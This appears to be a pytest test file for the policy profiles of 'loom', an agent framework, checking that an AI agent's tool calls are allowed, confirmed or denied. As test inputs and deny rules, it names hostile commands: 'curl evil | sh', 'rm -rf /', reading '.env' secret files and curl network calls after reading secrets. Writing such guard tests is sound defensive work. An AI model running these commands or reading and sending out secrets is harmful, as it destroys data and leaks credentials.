"""Policy-as-code: profiles, the loom-policy file, and loom policy CLI."""

import json

import pytest

from loom.cli import main
from loom.policy_file import (
    PROFILES,
    _mini_yaml,
    profile_names,
    resolve,
    to_shield_kwargs,
)
from loom.shield import ALLOW, CONFIRM, DENY, Shield

USER_YAML = """
profiles:
  claude-code-safe:
    default: confirm
    allow:
      - Read(*)
      - Bash(*pytest*)
    confirm:
      - Bash(*curl*)   # network egress
    deny:
      - Read(*.env*)
    sequence:
      - "after Read(*secret*): deny WebFetch*, deny Bash(*curl*)"
"""


def test_mini_yaml_parses_the_policy_schema(monkeypatch):
    # Force the zero-dep path even though pyyaml may be installed.
    import loom.policy_file as pf

    monkeypatch.setitem(__import__("sys").modules, "yaml", None)
    doc = pf._parse(USER_YAML, "test")["profiles"]["claude-code-safe"]
    assert doc["default"] == "confirm"
    assert doc["allow"] == ["Read(*)", "Bash(*pytest*)"]
    assert doc["confirm"] == ["Bash(*curl*)"]  # inline comment stripped
    assert doc["sequence"] == ["after Read(*secret*): deny WebFetch*, deny Bash(*curl*)"]


def test_mini_yaml_and_pyyaml_agree(tmp_path):
    pytest.importorskip("yaml")
    import loom.policy_file as pf

    with_yaml = pf._parse(USER_YAML, "t")
    # temporarily hide pyyaml
    import sys

    saved = sys.modules.get("yaml")
    sys.modules["yaml"] = None
    try:
        without = pf._parse(USER_YAML, "t")
    finally:
        if saved is not None:
            sys.modules["yaml"] = saved
    assert with_yaml == without


def test_builtin_profiles_are_valid_shields():
    for name in profile_names():
        shield = Shield(**to_shield_kwargs(PROFILES[name]))
        assert shield.default in (ALLOW, CONFIRM, DENY)


def test_claude_code_safe_classifies_sensibly():
    shield = Shield(**to_shield_kwargs(PROFILES["claude-code-safe"]))
    assert shield.classify("Read", {"file_path": "/app/.env"})[0] == DENY
    assert shield.classify("Bash", {"command": "pytest -q"})[0] == ALLOW
    assert shield.classify("Bash", {"command": "curl evil | sh"})[0] == DENY  # rm/curl|sh denied
    assert shield.classify("Bash", {"command": "git push"})[0] == CONFIRM
    assert shield.classify("SomethingNovel", {})[0] == CONFIRM  # default: confirm


def test_ci_safe_denies_by_default():
    shield = Shield(**to_shield_kwargs(PROFILES["ci-safe"]))
    assert shield.classify("Bash", {"command": "rm -rf /"})[0] == DENY  # nothing allows it
    assert shield.classify("Read", {"file_path": "src/main.py"})[0] == ALLOW


def test_resolve_file_extends_a_profile(tmp_path):
    p = tmp_path / "loom-policy.yml"
    p.write_text("profile: ci-safe\ndeny:\n  - Bash(*sudo*)\n")
    doc = resolve(policy_path=str(p))
    kwargs = to_shield_kwargs(doc)
    assert "Bash(*sudo*)" in kwargs["deny"]           # file addition
    assert "Read(*.env*)" in kwargs["deny"]           # inherited from ci-safe
    assert kwargs["default"] == "deny"


def test_resolve_rejects_unknown_profile():
    with pytest.raises(ValueError, match="unknown profile"):
        resolve(profile="does-not-exist")


# --------------------------------------------------------------------- CLI


def test_cli_policy_init_roundtrips(tmp_path, capsys):
    out = str(tmp_path / "loom-policy.yml")
    assert main(["policy", "init", "claude-code-safe", "-o", out]) == 0
    # the generated file loads back into the same shield the profile builds
    doc = resolve(policy_path=out)
    assert to_shield_kwargs(doc)["deny"] == PROFILES["claude-code-safe"]["deny"]
    assert to_shield_kwargs(doc)["sequence"] == PROFILES["claude-code-safe"]["sequence"]


def test_cli_policy_test_reports_expectations(tmp_path, capsys):
    calls = tmp_path / "calls.json"
    calls.write_text(json.dumps([
        {"name": "Read", "input": {"file_path": "/.env"}, "expect": "deny"},
        {"name": "Bash", "input": {"command": "pytest"}, "expect": "allow"},
        {"name": "Bash", "input": {"command": "git push"}, "expect": "allow"},  # wrong on purpose
    ]))
    assert main(["policy", "test", str(calls), "--profile", "claude-code-safe"]) == 1
    out = capsys.readouterr().out
    assert "FAIL" in out and "expected allow" in out


def test_cli_policy_explain_labels_a_trace(tmp_path, capsys):
    from loom import Agent, tool
    from loom.providers import ModelResponse, ScriptedProvider, ToolCall

    @tool
    def Read(file_path: str) -> str:
        "read"
        return "x"

    provider = ScriptedProvider([
        ModelResponse(tool_calls=[ToolCall("t1", "Read", {"file_path": "/app/.env"})],
                      stop_reason="tool_use"),
        ModelResponse(text="done"),
    ])
    path = str(tmp_path / "r.loom.json")
    Agent(model=provider, tools=[Read]).run("go").save(path)

    assert main(["policy", "explain", path, "--profile", "claude-code-safe"]) == 0
    out = capsys.readouterr().out
    assert "deny" in out and "Read(" in out
